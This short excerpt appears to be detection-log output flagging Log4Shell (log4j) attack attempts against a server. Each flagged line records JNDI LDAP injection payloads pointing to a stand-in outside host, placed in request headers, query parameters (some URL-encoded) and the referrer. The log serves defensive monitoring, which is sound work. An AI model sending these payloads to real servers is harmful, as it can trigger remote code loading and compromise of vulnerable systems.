...
Found potential log4j attack in header x-api-key:${jndi:ldap://target.example.com/a}, client: attacker, server: victim.example.com, request: "GET /?test=${jndi:ldap://target.example.com/a} HTTP/1.1", host: "victim.example.com", referrer: "${jndi:ldap://target.example.com/a}"
Found potential log4j attack in header if-match:${jndi:ldap://target.example.com/}, client: attacker, server: victim.example.com, request: "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Ftarget.example.com%2F%7D&page=%24%7Bjndi%3Aldap%3A%2F%2Ftarget.example.com%2F%7D&search=%24%7Bjndi%3Aldap%3A%2F%2Ftarget.example.com%2F%7D HTTP/1.1", host: "victim.example.com", referrer: "${jndi:ldap://target.example.com/}"
```
